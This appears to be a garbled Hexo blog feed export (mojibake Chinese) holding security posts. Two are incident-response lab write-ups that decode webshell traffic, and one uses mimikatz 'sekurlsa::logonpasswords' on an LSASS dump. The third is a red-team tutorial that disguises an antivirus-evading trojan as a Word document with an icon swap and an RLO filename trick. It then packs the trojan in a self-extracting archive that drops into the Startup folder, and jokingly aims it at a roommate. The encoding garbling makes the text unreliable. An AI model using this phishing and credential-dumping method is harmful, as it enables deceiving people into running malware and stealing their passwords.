class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http.request.uri contains <span class="string">&quot;/product2.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl a å…¨é€‰ï¼Œç„¶åctrl m åšæ ‡è®°</span></span><br></pre></td></tr></table></figure><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled4.png" alt="Untitled"></p><p>ä¹‹åé‡æ–°å›å½’httpï¼Œçœ‹æœ¨é©¬çš„å“åº”åŒ…</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled5.png" alt="Untitled"></p><p>è¿½è¸ªhttpæµï¼Œæ˜¯æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼Œæœç´¢ä¸€ä¸‹</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled6.png" alt="Untitled"></p><p>æ‰¾ä¸ªmd5è§£å¯†ä¸‹</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled7.png" alt="Untitled"></p><p>flagä¸å¯¹ï¼Œå¹¶ä¸æ˜¯çœŸçš„å¯†ç </p><h3 id="3ã€çœŸå®çš„Adminå¯†ç "><a href="#3ã€çœŸå®çš„Adminå¯†ç " class="headerlink" title="3ã€çœŸå®çš„Adminå¯†ç "></a>3ã€çœŸå®çš„Adminå¯†ç </h3><p>ç»§ç»­æŸ¥çœ‹èšå‰‘çš„å“åº”åŒ…ã€‚åœ¨3414è¿™ä¸ªåŒ…ä¸­å¯ä»¥çœ‹åˆ°æ­¤æ—¶å¹¶æ²¡æœ‰Adminç”¨æˆ·ã€‚å› æ­¤æ¨æµ‹Adminæ˜¯é»‘å®¢æƒé™ç»´æŒçš„ä¸€ä¸ªç”¨æˆ·</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled8.png" alt="Untitled"></p><p>é‚£è¿™æœ‰ç‚¹éº»çƒ¦äº†ï¼Œå¦‚æœAdminæ˜¯é»‘å®¢æ–°å¢ç”¨æˆ·åšçš„æƒé™ç»´æŒçš„è¯ï¼Œæ˜¯æ²¡æœ‰è¿”å›ç»“æœçš„ï¼Œæˆ‘ä»¬éœ€è¦ç ´è§£èšå‰‘çš„æµé‡ã€‚èšå‰‘çš„æµé‡ç‰¹å¾è¿˜æ˜¯å¾ˆå¥½é‰´åˆ«çš„ï¼Œå¦‚æœä¸æ‡‚ï¼Œè¿˜è¯·ç§»æ­¥åˆ°<strong>ã€è“é˜Ÿåº”æ€¥ã€‘WebShell æµé‡ç‰¹å¾</strong> æ–‡ç« æŸ¥çœ‹ã€‚</p><p>æˆ‘ä»¬æ‰¾æ²¡æœ‰å›æ˜¾æˆ–å›æ˜¾è¾ƒå°‘çš„åŒ…ï¼Œå¯¹è¯·æ±‚çš„èšå‰‘æµé‡åšè§£æã€‚ä¸ºäº†è®©å¤§å®¶åŠ¨æ‰‹ç ´è§£ï¼Œè¿™é‡Œä¹Ÿä¸å†™è„šæœ¬å·¥å…·ï¼Œä»…ç”¨ä¸€äº›åœ¨çº¿ç½‘ç«™å³å¯ã€‚</p><p>å¥½åœ¨è¿™ä¸ªåŠ å¯†å¹¶ä¸æ˜¯å¾ˆéš¾ï¼Œä»…ä»…URLå’Œbase64ã€‚æˆ‘ä»¬éœ€è¦å¯¹èšå‰‘çš„æµé‡æå¤´å»å°¾ï¼š</p><ol><li>å…ˆURLè§£ç ä¸€ä¸‹</li><li>å†ä»¥&amp;ä¸ºåˆ†éš”ç¬¦ï¼Œå»æ‰æ‰€æœ‰çš„&amp;ï¼Œä»…ä»…ç•™ä¸‹æ¥ä¸­é—´æœ€å¤§çš„base64ç¼–ç </li><li>å†è¿›è¡Œbase64è§£ç ä¸‹</li></ol><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled9.png" alt="Untitled"></p><p>å†base64è§£ç å³å¯ï¼Œè¿™é‡Œçš„ç¤ºä¾‹æ˜¯3531å·æ•°æ®åŒ…ï¼Œå¤§å®¶å¯ä»¥ä¸€åŒå°è¯•è§£å¯†ä¸‹</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled10.png" alt="Untitled"></p><p>å½“ç„¶ï¼Œæ›´ç®€å•çš„æ–¹æ³•æ˜¯ç›´æ¥ç­›é€‰èšå‰‘çš„æµé‡åŒ…ï¼Œåœ¨ä¸‹é¢ä¸€æ çœ‹è¯·æ±‚çš„æ•°æ®</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled11.png" alt="Untitled"></p><p>ä¸€æ­¥æ­¥è§£å¯†ï¼Œæœ€ååœ¨15190å·åŒ…ä¸­æ‰¾åˆ°ï¼Œè®°å¾—è§£å¯†æ—¶æŠŠ<code>il</code> å»æ‰</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled12.png" alt="Untitled"></p><p>æ‰¾åˆ°é»‘å®¢æƒé™ç»´æŒæ—¶åˆ›å»ºçš„Admin çš„å¯†ç æ˜¯<code>Password1</code></p><h2 id="ä¸‰ã€æ­¥éª¤äºŒï¼šLSASS-exeçš„ç¨‹åºè¿›ç¨‹IDæ˜¯å¤šå°‘ï¼Ÿ"><a href="#ä¸‰ã€æ­¥éª¤äºŒï¼šLSASS-exeçš„ç¨‹åºè¿›ç¨‹IDæ˜¯å¤šå°‘ï¼Ÿ" class="headerlink" title="ä¸‰ã€æ­¥éª¤äºŒï¼šLSASS.exeçš„ç¨‹åºè¿›ç¨‹IDæ˜¯å¤šå°‘ï¼Ÿ"></a>ä¸‰ã€æ­¥éª¤äºŒï¼šLSASS.exeçš„ç¨‹åºè¿›ç¨‹IDæ˜¯å¤šå°‘ï¼Ÿ</h2><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled13.png" alt="Untitled"></p><p>åŒæ ·çš„ï¼Œè¿™ä¸ªä¹Ÿéœ€è¦ä¸€æ­¥æ­¥è§£å¯†èšå‰‘çš„æµé‡ï¼Œåœ¨<code>5922</code>å·æ•°æ®åŒ…</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled14.png" alt="Untitled"></p><h2 id="å››ã€æ­¥éª¤ä¸‰ï¼šç”¨æˆ·WIN101çš„å¯†ç æ˜¯ä»€ä¹ˆ"><a href="#å››ã€æ­¥éª¤ä¸‰ï¼šç”¨æˆ·WIN101çš„å¯†ç æ˜¯ä»€ä¹ˆ" class="headerlink" title="å››ã€æ­¥éª¤ä¸‰ï¼šç”¨æˆ·WIN101çš„å¯†ç æ˜¯ä»€ä¹ˆ?"></a>å››ã€æ­¥éª¤ä¸‰ï¼šç”¨æˆ·WIN101çš„å¯†ç æ˜¯ä»€ä¹ˆ?</h2><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled15.png" alt="Untitled"></p><h3 id="1ã€å¯¼å‡ºå¯†ç æ–‡ä»¶"><a href="#1ã€å¯¼å‡ºå¯†ç æ–‡ä»¶" class="headerlink" title="1ã€å¯¼å‡ºå¯†ç æ–‡ä»¶"></a>1ã€å¯¼å‡ºå¯†ç æ–‡ä»¶</h3><p>åœ¨æ­¥éª¤äºŒä¸­ï¼Œé»‘å®¢dumpä¸‹æ¥lsassè¿›ç¨‹åˆ°<code>C:\temp\OnlineShopBackup.zip</code> ï¼Œé‚£æˆ‘ä»¬éœ€è¦æ‹¿åˆ°è¿™ä¸ªæ–‡ä»¶</p><p>åœ¨<code>6944</code>å·æ•°æ®åŒ…ä¸­ï¼Œè§£å¯†åæ˜¯æŸ¥çœ‹<code>C:\temp\OnlineShopBackup.zip</code> çš„å†…å®¹ï¼Œé‚£ä¹ˆå®ƒçš„ç›¸åº”åŒ…å°±æ˜¯å’±ä»¬éœ€è¦çš„æ–‡ä»¶äº†ã€‚ç›´æ¥åœ¨ã€æ–‡ä»¶ã€‘ä¸­ã€åˆ°å¤„å¯¹è±¡ã€‘é€‰æ‹©httpï¼Œæ‰¾åˆ°è¿™ä¸ªå·æ•°æ®åŒ…ä¸‹æ–¹çš„47MBçš„æ•°æ®ä¿å­˜</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled16.png" alt="Untitled"></p><p>å¯¼å‡ºäº†ä¸€ä¸ªproduct2.php æ–‡ä»¶ï¼Œä½†è¿™ä¸ªæ•°æ®åŒ…ä¸­è¿˜æœ‰èšå‰‘çš„æ•°æ®</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled17.png" alt="Untitled"></p><p>åˆ é™¤å¼€å¤´çš„<code>e1c1709</code> ï¼Œä¿®æ”¹åç¼€æˆdmp</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled18.png" alt="Untitled"></p><h3 id="2ã€åŠ è½½å¯†ç æ–‡ä»¶"><a href="#2ã€åŠ è½½å¯†ç æ–‡ä»¶" class="headerlink" title="2ã€åŠ è½½å¯†ç æ–‡ä»¶"></a>2ã€åŠ è½½å¯†ç æ–‡ä»¶</h3><p>äº¤ç»™mimikatz å»åŠ è½½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::<span class="variable constant_">minidump</span> <span class="number">1</span>.dmp</span><br><span class="line">sekurlsa::<span class="variable constant_">logonpasswords</span></span><br></pre></td></tr></table></figure><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled19.png" alt="Untitled"></p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled20.png" alt="Untitled"></p>]]></content>
      
      
      <categories>
          
          <category> ç„æœºåº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æµé‡ç‰¹å¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç« ç‰¹å¾åˆ†æâ€”wafä¸Šæˆªè·çš„é»‘å®¢æ”»å‡»æµé‡</title>
      <link href="/2024/06/13/xuanji-diliuzhang-waf/"/>
      <url>/2024/06/13/xuanji-diliuzhang-waf/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç« ç‰¹å¾åˆ†æâ€”wafä¸Šæˆªè·çš„é»‘å®¢æ”»å‡»æµé‡"><a href="#ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç« ç‰¹å¾åˆ†æâ€”wafä¸Šæˆªè·çš„é»‘å®¢æ”»å‡»æµé‡" class="headerlink" title="ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç« ç‰¹å¾åˆ†æâ€”wafä¸Šæˆªè·çš„é»‘å®¢æ”»å‡»æµé‡"></a>ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç« ç‰¹å¾åˆ†æâ€”wafä¸Šæˆªè·çš„é»‘å®¢æ”»å‡»æµé‡</h1><h2 id="ä¸€ã€é™„ä»¶ä¸‹è½½"><a href="#ä¸€ã€é™„ä»¶ä¸‹è½½" class="headerlink" title="ä¸€ã€é™„ä»¶ä¸‹è½½"></a>ä¸€ã€é™„ä»¶ä¸‹è½½</h2><p>ä¸‹è½½å¥½æµé‡æ•°æ®åŒ…<code>.pcap</code>ï¼Œåœ¨<code>WireShark</code>ä¸­æ‰“å¼€</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613132832287.png" alt="image-20240613132832287"></p><h2 id="äºŒã€æ­¥éª¤ä¸€ï¼šé»‘å®¢ç™»é™†ç³»ç»Ÿçš„å¯†ç "><a href="#äºŒã€æ­¥éª¤ä¸€ï¼šé»‘å®¢ç™»é™†ç³»ç»Ÿçš„å¯†ç " class="headerlink" title="äºŒã€æ­¥éª¤ä¸€ï¼šé»‘å®¢ç™»é™†ç³»ç»Ÿçš„å¯†ç "></a>äºŒã€æ­¥éª¤ä¸€ï¼šé»‘å®¢ç™»é™†ç³»ç»Ÿçš„å¯†ç </h2><p><img src="/img/xuanji-diliuzhang-waf/image-20240613132906529.png" alt="image-20240613132906529"></p><h3 id="1ã€ç­›é€‰POSTè¯·æ±‚"><a href="#1ã€ç­›é€‰POSTè¯·æ±‚" class="headerlink" title="1ã€ç­›é€‰POSTè¯·æ±‚"></a>1ã€ç­›é€‰POSTè¯·æ±‚</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure><p>ç™»é™†çš„åœ°å€åœ¨<code>/admin/login.php?rec=login</code></p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133123336.png" alt="image-20240613133123336"></p><h3 id="2ã€ç­›é€‰å…¨éƒ¨çš„ç™»é™†è¯·æ±‚"><a href="#2ã€ç­›é€‰å…¨éƒ¨çš„ç™»é™†è¯·æ±‚" class="headerlink" title="2ã€ç­›é€‰å…¨éƒ¨çš„ç™»é™†è¯·æ±‚"></a>2ã€ç­›é€‰å…¨éƒ¨çš„ç™»é™†è¯·æ±‚</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot; &amp;&amp; http.request.uri contains &quot;rec=login&quot;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‰¾æœ€åå‡ æ¡</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133320489.png" alt="image-20240613133320489"></p><h2 id="ä¸‰ã€æ­¥éª¤äºŒï¼šé»‘å®¢å‘ç°çš„å…³é”®å­—ç¬¦ä¸²"><a href="#ä¸‰ã€æ­¥éª¤äºŒï¼šé»‘å®¢å‘ç°çš„å…³é”®å­—ç¬¦ä¸²" class="headerlink" title="ä¸‰ã€æ­¥éª¤äºŒï¼šé»‘å®¢å‘ç°çš„å…³é”®å­—ç¬¦ä¸²"></a>ä¸‰ã€æ­¥éª¤äºŒï¼šé»‘å®¢å‘ç°çš„å…³é”®å­—ç¬¦ä¸²</h2><p>é¢˜ç›®ä¸­xxxçš„æ•°é‡æœ‰32ä¸ªï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²ä¹Ÿæ—¢æœ‰å¯èƒ½å°±æ˜¯32ä½</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133436956.png" alt="image-20240613133436956"></p><h3 id="1ã€èšå‰‘æµé‡ç‰¹å¾"><a href="#1ã€èšå‰‘æµé‡ç‰¹å¾" class="headerlink" title="1ã€èšå‰‘æµé‡ç‰¹å¾"></a>1ã€èšå‰‘æµé‡ç‰¹å¾</h3><p>æŸ¥çœ‹httpæµé‡çš„æ—¶å€™ï¼Œå‘ç°å¾ˆå¤šå¯¹<code>a.php</code>æ–‡ä»¶å‘èµ·è®¿é—®</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133836165.png" alt="image-20240613133836165"></p><p>ä»”ç»†æŸ¥çœ‹æµé‡å‘ç°æ˜¯èšå‰‘çš„æµé‡ç‰¹å¾</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613133746151.png" alt="image-20240613133746151"></p><h3 id="2ã€ç­›é€‰èšå‰‘çš„å“åº”æ•°æ®åŒ…"><a href="#2ã€ç­›é€‰èšå‰‘çš„å“åº”æ•°æ®åŒ…" class="headerlink" title="2ã€ç­›é€‰èšå‰‘çš„å“åº”æ•°æ®åŒ…"></a>2ã€ç­›é€‰èšå‰‘çš„å“åº”æ•°æ®åŒ…</h3><p>æˆ‘ä»¬ç­›é€‰æ‰€æœ‰èšå‰‘çš„è¯·æ±‚åŒ…ï¼Œä¹‹ååšä¸Šæ ‡è®°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.uri contains &quot;/a.php&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/xuanji-diliuzhang-waf/image-20240613145606097.png" alt="image-20240613145606097"></p><p>å›åˆ°httpä¸­ï¼Œçœ‹èšå‰‘çš„å“åº”åŒ…</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613150202712.png" alt="image-20240613150202712"></p><h2 id="å››ã€æ­¥éª¤ä¸‰ï¼šé»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç "><a href="#å››ã€æ­¥éª¤ä¸‰ï¼šé»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç " class="headerlink" title="å››ã€æ­¥éª¤ä¸‰ï¼šé»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç "></a>å››ã€æ­¥éª¤ä¸‰ï¼šé»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç </h2><p><img src="/img/xuanji-diliuzhang-waf/image-20240613150423924.png" alt="image-20240613150423924"></p><p>åŒæ ·æ˜¯åœ¨èšå‰‘çš„å“åº”åŒ…ä¸­æ‰¾åˆ°</p><p><img src="/img/xuanji-diliuzhang-waf/image-20240613150411200.png" alt="image-20240613150411200"></p>]]></content>
      
      
      <categories>
          
          <category> ç„æœºåº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç„æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€çº¢é˜Ÿå…¥ä¾µã€‘æ–‡ä»¶é’“é±¼â€”RLOæ„é€ åç¼€</title>
      <link href="/2024/06/07/Red-Team-Invasion-RLO-file-fishing/"/>
      <url>/2024/06/07/Red-Team-Invasion-RLO-file-fishing/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€çº¢é˜Ÿå…¥ä¾µã€‘æ–‡ä»¶é’“é±¼â€”RLOæ„é€ åç¼€"><a href="#ã€çº¢é˜Ÿå…¥ä¾µã€‘æ–‡ä»¶é’“é±¼â€”RLOæ„é€ åç¼€" class="headerlink" title="ã€çº¢é˜Ÿå…¥ä¾µã€‘æ–‡ä»¶é’“é±¼â€”RLOæ„é€ åç¼€"></a>ã€çº¢é˜Ÿå…¥ä¾µã€‘æ–‡ä»¶é’“é±¼â€”RLOæ„é€ åç¼€</h1><h2 id="ä¸€ã€å‰æ™¯éœ€æ±‚"><a href="#ä¸€ã€å‰æ™¯éœ€æ±‚" class="headerlink" title="ä¸€ã€å‰æ™¯éœ€æ±‚"></a>ä¸€ã€å‰æ™¯éœ€æ±‚</h2><p>å½“æˆ‘ä»¬æƒ³å‘é€ä¸€ä¸ªæœ¨é©¬ç»™èº«è¾¹å‡Œæ™¨ä¸¤ç‚¹è¿˜åœ¨è®¡åˆ’æ‰“å›¢çš„å®¤å‹ï¼Œå¸®åŠ©ä»–æˆ’ç½‘ç˜¾ï¼Œæ—©ç¡æ—©èµ·å…»å¥½èº«ä½“ã€‚æˆ‘ä»¬éœ€è¦åšçš„å‡†å¤‡ï¼š</p><ol><li>å…¬ç½‘æœåŠ¡å™¨</li><li>å…æ€çš„exeæœ¨é©¬</li><li>ç›‘å¬çš„æœåŠ¡ç«¯</li><li>Resource Hacker</li><li>winrar å‹ç¼©åŒ…ç¨‹åº</li></ol><p>å¦‚ä¸‹æ‰€ç¤ºï¼š<img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606205723891.png" alt="image-20240606205723891"></p><p>ä½†æ˜¯å•å•çš„exe éš¾å…è®©äººèµ·ç–‘å¿ƒï¼Œæä¸å¥½ä¼šæŒ¨å®¤å‹çš„å¤§æ‹³å¤´ã€‚</p><h2 id="äºŒã€æœ¨é©¬å›¾æ ‡ä¿®æ”¹"><a href="#äºŒã€æœ¨é©¬å›¾æ ‡ä¿®æ”¹" class="headerlink" title="äºŒã€æœ¨é©¬å›¾æ ‡ä¿®æ”¹"></a>äºŒã€æœ¨é©¬å›¾æ ‡ä¿®æ”¹</h2><p>è¿™é‡Œç”¨<code>Resource Hacker</code>å·¥å…·ï¼Œç»™exeæœ¨é©¬ä¸Šä¸Šå›¾æ ‡ã€‚å½“ç„¶ï¼Œä¹Ÿæœ‰å…¶ä»–ç›¸å…³å·¥å…·å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œåªæ˜¯ä¸€ä¸ªç¤ºä¾‹</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210010305.png" alt="image-20240606210010305"></p><p>å¦å¤–ä»ç½‘ä¸Šæ‰¾æ¥ä¸€ä¸ªç±»ä¼¼word çš„ico å›¾æ ‡ï¼Œå½“ç„¶äº†ï¼Œè¿™ä¸ªå›¾æ ‡å¹¶ä¸æ˜¯çœŸçš„ï¼Œå„ä½å¯ä»¥åŠ¨æ‰‹è‡ªå·±åˆ¶ä½œä¸€ä¸ªã€‚</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210151419.png" alt="image-20240606210151419"></p><p>æ‰“å¼€<code>Resource Hacker</code>å·¥å…·ï¼Œåœ¨Fileä¸­åŠ è½½exeæœ¨é©¬æ–‡ä»¶ï¼Œé€‰æ‹©<code>Icon Group</code>ï¼Œå¿«æ·é”®<code>Ctrl + R</code>æ‰“å¼€æ›¿æ¢å›¾æ ‡</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210433007.png" alt="image-20240606210433007"></p><p>é€‰ä¸­word å›¾æ ‡è¿›è¡Œæ›¿æ¢</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606210937912.png" alt="image-20240606210937912"></p><p><code>ctrl + s</code> ä¿å­˜å°±å¯ä»¥äº†ï¼Œå®ƒæ›¿æ¢ä¹‹åå¯èƒ½è¿˜æ˜¯åŸæ ·ï¼Œå¤šåˆ·æ–°ï¼Œæˆ–è€…å°è¯•ä¿®æ”¹æ–‡ä»¶åã€‚</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606211538439.png" alt="image-20240606211538439"></p><p>å†å°è¯•ä¸‹æ˜¯å¦è¿˜èƒ½è¿æ¥ï¼Œæ²¡æœ‰é—®é¢˜</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606212034856.png" alt="image-20240606212034856"></p><h2 id="ä¸‰ã€æœ¨é©¬åç¼€ä¿®æ”¹"><a href="#ä¸‰ã€æœ¨é©¬åç¼€ä¿®æ”¹" class="headerlink" title="ä¸‰ã€æœ¨é©¬åç¼€ä¿®æ”¹"></a>ä¸‰ã€æœ¨é©¬åç¼€ä¿®æ”¹</h2><p>æ—¢ç„¶è¦ä¼ªè£…æˆword ï¼Œæˆ‘ä»¬éœ€è¦æŠŠæœ¨é©¬çš„åç§°å’Œåç¼€éƒ½æ”¹äº†</p><p>å…ˆæ”¹åç§°ï¼Œå¦‚<code>å…³äºè¯„é€‰2024å¹´æ ¡çº§ä¼˜ç§€åº”å±Šå¤§å­¦æ¯•ä¸šç”Ÿçš„é€šçŸ¥.exe</code></p><p>å†è¿›è¡ŒRLOæ’å…¥ï¼Œå†æ¬¡å¯¹æ–‡ä»¶é‡å‘½åï¼Œåœ¨<code>.exe</code>çš„å‰é¢è¿›è¡Œå³é”®ï¼Œé€‰æ‹©æ’å…¥<code>Unicode æ§åˆ¶å­—ç¬¦ä¸²(I)</code>ã€‚è¿™é‡Œæ˜¯åœ¨è™šæ‹Ÿæœºä¸­çš„ç¤ºèŒƒï¼Œåœ¨ä¸»æœºä¸Šæˆªå›¾ä¸å¥½æˆªï¼ˆæ³¨æ„ï¼šè¦å…ˆé‡å‘½åï¼Œå°†å…‰æ ‡æ”¾åœ¨.exe çš„å‰é¢ï¼Œå†å³é”®ï¼‰</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606213201121.png" alt="image-20240606213201121"></p><p>è¿›è¡Œå€’å™è¾“å…¥<code>xcod</code>ï¼Œåç¼€å°±å˜æˆäº†<code>docx</code>ï¼Œå†æµ‹è¯•ä¸€ä¸‹è¿è¡Œæ•ˆæœï¼Œæ˜¯çœŸä¸é”™</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214310982.png" alt="image-20240606214310982"></p><p>è¿™æ ·ä¸€ä¸ªåŸºç¡€çš„word æ–‡æ¡£é’“é±¼å°±åšå¥½äº†ã€‚</p><p>ä½†æ˜¯å®ƒåŒå‡»ä¹‹åå¹¶æ²¡æœ‰å‡ºç°wordæ–‡ä»¶ï¼Œè¿˜æ˜¯ä¼šè®©äººèµ·ç–‘å¿ƒã€‚</p><h2 id="å››ã€ZIP-è‡ªå®šä¹‰å‹ç¼©é’“é±¼"><a href="#å››ã€ZIP-è‡ªå®šä¹‰å‹ç¼©é’“é±¼" class="headerlink" title="å››ã€ZIP è‡ªå®šä¹‰å‹ç¼©é’“é±¼"></a>å››ã€ZIP è‡ªå®šä¹‰å‹ç¼©é’“é±¼</h2><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€ç¯‡çœŸæ­£çš„word æ–‡æ¡£ï¼Œå¦‚<code>å…³äºè¯„é€‰2024å¹´æ ¡çº§ä¼˜ç§€åº”å±Šå¤§å­¦æ¯•ä¸šç”Ÿçš„é€šçŸ¥.dock</code>ï¼Œå†…å®¹å¯ä»¥å†™çš„æ¥è¿‘çœŸå®ä¸€ç‚¹ï¼Œä¸è®©äººæ€€ç–‘ã€‚</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214637147.png" alt="image-20240606214637147"></p><p>å¯¹æœ¨é©¬å’Œword æ–‡æ¡£è¿›è¡Œå‹ç¼©ï¼Œåé¢çš„æ­¥éª¤æŒ‰ç…§å›¾ç‰‡ä¸€æ­¥ä¸€æ­¥æ¥å§</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214752171.png" alt="image-20240606214752171"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606214819374.png" alt="image-20240606214819374"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215019098.png" alt="image-20240606215019098"></p><p>è¿™é‡Œçš„è·¯å¾„ï¼Œå¯ä»¥æ˜¯ä»»æ„è·¯å¾„ï¼Œå¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// ä»»ä½•äººå¯ä»¥å†™å…¥çš„æ–‡ä»¶è·¯å¾„</span><br><span class="line">C:\Windows\Temp</span><br><span class="line"></span><br><span class="line">// å…·æœ‰æƒé™ç»´æŒæ•ˆæœçš„</span><br><span class="line">&quot;C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è·¯å¾„å°±ä¸å¤šè¯´äº†ï¼Œæ¼”ç¤ºæ•ˆæœï¼Œæˆ‘è¿™é‡Œç”¨<code>C:\Windows\Temp</code>ã€‚å¦‚æœæƒ³ç”¨ç»´æŒæ•ˆæœè®°å¾—åŠ åŒå¼•å·</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215238441.png" alt="image-20240606215238441"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240607123107078.png" alt="image-20240607123107078"></p><p>è¿™é‡Œè¦æŠŠè·¯å¾„å’Œæ–‡ä»¶åå¯¹åº”èµ·æ¥ï¼Œå¦‚æœä¸­é—´æœ‰ç©ºæ ¼éœ€è¦ç”¨åŒå¼•å·å¼•èµ·æ¥</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215607379.png" alt="image-20240606215607379"></p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215620154.png" alt="image-20240606215620154"></p><p>å°±å¯ä»¥äº†ï¼Œä¸€è·¯ç¡®å®šå³å¯ã€‚</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215652648.png" alt="image-20240606215652648"></p><p>å˜æˆäº†<code>test.exe</code></p><p>å†é‡å¤ä¸€äºŒï¼Œä¿®æ”¹å›¾æ ‡å’Œåç¼€ã€‚æœ€ç»ˆæˆå“</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606215957542.png" alt="image-20240606215957542"></p><p>æµ‹è¯•æ•ˆæœï¼Œè¿™é‡Œæœ¨é©¬éœ€ä¸è¿›è¡Œåç¼€ä¿®æ”¹ï¼Œå¾—åŸæ±åŸå‘³çš„exe æ‰è¡Œ</p><p><img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606220822819.png" alt="image-20240606220822819"></p><p>åŒæ—¶ä¹Ÿèƒ½å¼¹å‡ºæ¥word<img src="/img/Red-Team-Invasion-RLO-file-fishing/image-20240606220852058.png" alt="image-20240606220852058"></p><p>é’“é±¼å˜›ï¼Œè®²ç©¶çš„æ˜¯æ„¿è€…ä¸Šé’©ï¼Œå¦‚æœå®¤å‹è¿™æ¬¡ä¸ä¸Šå½“ï¼Œé‚£å°±ç­‰å¾…ä¸‹ä¸€ä¸ªæ—¶æœºã€‚å½“ç„¶ï¼Œä¸æ­¢wordï¼Œä¹Ÿå¯ä»¥ä¼ªè£…æˆå…¶ä»–çš„ä¸œè¥¿ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çº¢é˜Ÿå…¥ä¾µ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶é’“é±¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Pythonæ­¦å™¨åº“ã€‘å–ä»£netcatï¼ˆè¿‡æ€è½¯ï¼‰</title>
      <link href="/2024/05/30/Python-tools-netcat/"/>
      <url>/2024/05/30/Python-tools-netcat/</url>
      
